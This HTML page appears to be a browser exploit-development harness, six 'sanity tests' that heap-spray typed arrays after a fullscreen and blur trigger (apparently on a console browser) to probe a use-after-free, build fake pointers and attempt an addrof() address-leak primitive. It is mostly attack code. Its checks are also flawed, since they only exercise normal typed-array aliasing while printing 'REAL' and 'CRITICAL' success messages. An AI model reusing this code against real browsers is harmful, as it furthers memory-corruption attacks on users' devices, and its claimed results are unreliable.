<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Sanity Tech 9</title>
</head>
<body>

<h1>TECH 9 SANITY - TYPE CONFUSION VALIDATION</h1>

<h2>SANITY 1: Verify Byte Write Persistence</h2>
<button onclick="s1()">RUN</button>
<div id="s1"></div>
<script>
function s1() {
    const r = document.getElementById('s1');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Create Uint8 view
        const u8 = new Uint8Array(c.buffer);
        
        // Write UNIQUE pattern
        const pattern = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22];
        for(let i = 0; i < 8; i++) {
            u8[i] = pattern[i];
        }
        
        r.innerHTML += 'Written bytes: ';
        for(let i = 0; i < 8; i++) {
            r.innerHTML += pattern[i].toString(16) + ' ';
        }
        r.innerHTML += '<br>';
        
        // Read back via Uint8
        r.innerHTML += 'Read back (Uint8): ';
        let match = true;
        for(let i = 0; i < 8; i++) {
            r.innerHTML += u8[i].toString(16) + ' ';
            if(u8[i] !== pattern[i]) match = false;
        }
        r.innerHTML += '<br>';
        
        if(match) {
            r.innerHTML += '<b>REAL: Bytes persisted</b><br>';
        } else {
            r.innerHTML += '<b>FAKE: Bytes changed</b><br>';
        }
        
        // Read as Float64
        const asFloat = c[0];
        const buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = asFloat;
        const asHex = new BigUint64Array(buf)[0];
        
        r.innerHTML += '<br>As Float64: ' + asFloat + '<br>';
        r.innerHTML += 'As hex: 0x' + asHex.toString(16) + '<br>';
        
        // Expected: 0x2211FFEEDDCCBBAA
        if(asHex === 0x2211FFEEDDCCBBAAn) {
            r.innerHTML += '<b>REAL: Perfect type confusion!</b><br>';
        }
    };
}
</script>

<hr>

<h2>SANITY 2: Cross-View Consistency</h2>
<button onclick="s2()">RUN</button>
<div id="s2"></div>
<script>
function s2() {
    const r = document.getElementById('s2');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Create multiple views
        const u8 = new Uint8Array(c.buffer);
        const u32 = new Uint32Array(c.buffer);
        const f64 = new Float64Array(c.buffer);
        const dv = new DataView(c.buffer);
        
        r.innerHTML += 'Created 4 views<br>';
        
        // Write via Uint8
        u8[0] = 0x11;
        u8[1] = 0x22;
        u8[2] = 0x33;
        u8[3] = 0x44;
        
        r.innerHTML += '<br>Written via Uint8: 11 22 33 44<br>';
        
        // Read via Uint32
        const viaU32 = u32[0];
        r.innerHTML += 'Read via Uint32: 0x' + viaU32.toString(16) + '<br>';
        
        // Read via DataView
        const viaDV = dv.getUint32(0, true);
        r.innerHTML += 'Read via DataView: 0x' + viaDV.toString(16) + '<br>';
        
        // Read via Float64
        const viaF64 = f64[0];
        const bufF = new ArrayBuffer(8);
        new Float64Array(bufF)[0] = viaF64;
        const hexF = new BigUint64Array(bufF)[0];
        r.innerHTML += 'Read via Float64: 0x' + hexF.toString(16) + '<br>';
        
        // Check consistency
        if(viaU32 === 0x44332211 && viaDV === 0x44332211) {
            r.innerHTML += '<br><b>REAL: All views consistent!</b><br>';
        } else {
            r.innerHTML += '<br><b>FAKE: Views inconsistent</b><br>';
        }
    };
}
</script>

<hr>

<h2>SANITY 3: Write Float, Read Bytes</h2>
<button onclick="s3()">RUN</button>
<div id="s3"></div>
<script>
function s3() {
    const r = document.getElementById('s3');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Write known value as float
        const buf = new ArrayBuffer(8);
        new BigUint64Array(buf)[0] = 0x0102030405060708n;
        const floatVal = new Float64Array(buf)[0];
        
        c[1] = floatVal;
        
        r.innerHTML += 'Written to c[1] as Float64<br>';
        r.innerHTML += 'Expected bytes: 08 07 06 05 04 03 02 01<br>';
        
        // Read via Uint8
        const u8 = new Uint8Array(c.buffer);
        r.innerHTML += 'Read via Uint8[8-15]: ';
        
        let bytes = [];
        for(let i = 8; i < 16; i++) {
            bytes.push(u8[i].toString(16).padStart(2, '0'));
            r.innerHTML += u8[i].toString(16).padStart(2, '0') + ' ';
        }
        r.innerHTML += '<br>';
        
        // Check
        if(bytes.join('') === '0807060504030201') {
            r.innerHTML += '<b>REAL: Float->Byte conversion works!</b><br>';
        }
    };
}
</script>

<hr>

<h2>SANITY 4: Construct Fake Pointer</h2>
<button onclick="s4()">RUN</button>
<div id="s4"></div>
<script>
function s4() {
    const r = document.getElementById('s4');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const u8 = new Uint8Array(c.buffer);
        
        // Construct pointer-like value byte by byte
        // 0x7f1234567890 (typical heap address)
        u8[16] = 0x90;
        u8[17] = 0x78;
        u8[18] = 0x56;
        u8[19] = 0x34;
        u8[20] = 0x12;
        u8[21] = 0x7f;
        u8[22] = 0x00;
        u8[23] = 0x00;
        
        r.innerHTML += 'Written pointer bytes at offset 16<br>';
        
        // Read as Float64
        const asFloat = c[2];
        const buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = asFloat;
        const ptr = new BigUint64Array(buf)[0];
        
        r.innerHTML += 'Read as qword: 0x' + ptr.toString(16) + '<br>';
        
        if(ptr === 0x7f1234567890n) {
            r.innerHTML += '<b>REAL: Pointer construction works!</b><br>';
            
            // This proves we can craft arbitrary addresses
            r.innerHTML += '<br><b>CRITICAL: Can construct fake pointers!</b><br>';
        }
    };
}
</script>

<hr>

<h2>SANITY 5: addrof() Construction Test</h2>
<button onclick="s5()">RUN</button>
<div id="s5"></div>
<script>
function s5() {
    const r = document.getElementById('s5');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Convert to array
        const arr = Array.from(c);
        
        // Store object
        const obj = {marker: 0xBEEF};
        arr[4] = obj;
        
        r.innerHTML += 'Object stored in arr[4]<br>';
        
        // Try to read via Float64Array
        const leaked = c[4];
        
        r.innerHTML += 'c[4] raw: ' + leaked + '<br>';
        
        // Convert to hex
        const buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = leaked;
        const hex = new BigUint64Array(buf)[0];
        
        r.innerHTML += 'As hex: 0x' + hex.toString(16) + '<br>';
        
        // Now read via Uint8
        const u8 = new Uint8Array(c.buffer);
        r.innerHTML += 'Bytes at offset 32-39: ';
        for(let i = 32; i < 40; i++) {
            r.innerHTML += u8[i].toString(16).padStart(2, '0') + ' ';
        }
        r.innerHTML += '<br>';
        
        if(hex !== 0n && hex !== P) {
            r.innerHTML += '<b>POTENTIAL ADDRESS LEAK</b><br>';
            
            // Check if value looks like pointer
            if(hex > 0x100000000n && hex < 0x7FFFFFFFFFFFn) {
                r.innerHTML += '<b>LOOKS LIKE HEAP POINTER!</b><br>';
            }
        }
    };
}
</script>

<hr>

<h2>SANITY 6: Control Test - No UAF</h2>
<button onclick="s6()">RUN</button>
<div id="s6"></div>
<script>
function s6() {
    const r = document.getElementById('s6');
    r.innerHTML = 'Testing WITHOUT UAF (control)<br>';
    
    // Create normal array
    const normal = new Float64Array(8);
    normal.fill(1.234);
    
    r.innerHTML += 'Normal Float64Array created<br>';
    
    // Try Uint8 view
    const u8 = new Uint8Array(normal.buffer);
    
    r.innerHTML += 'Uint8Array view: ';
    for(let i = 0; i < 8; i++) {
        r.innerHTML += u8[i].toString(16) + ' ';
    }
    r.innerHTML += '<br>';
    
    // Write via Uint8
    u8[0] = 0xAA;
    u8[1] = 0xBB;
    
    r.innerHTML += 'Written AA BB via Uint8<br>';
    
    // Read via Float64
    const asFloat = normal[0];
    const buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = asFloat;
    const hex = new BigUint64Array(buf)[0];
    
    r.innerHTML += 'Read via Float64: 0x' + hex.toString(16) + '<br>';
    
    r.innerHTML += '<br><b>CONTROL: Type confusion works on NORMAL arrays</b><br>';
    r.innerHTML += 'This is EXPECTED behavior, not exploit<br>';
    r.innerHTML += '<br>The KEY is: Can we use UAF to access OTHER memory?<br>';
}
</script>

<p>Execute all 6 sanity tests</p>

</body>
</html>
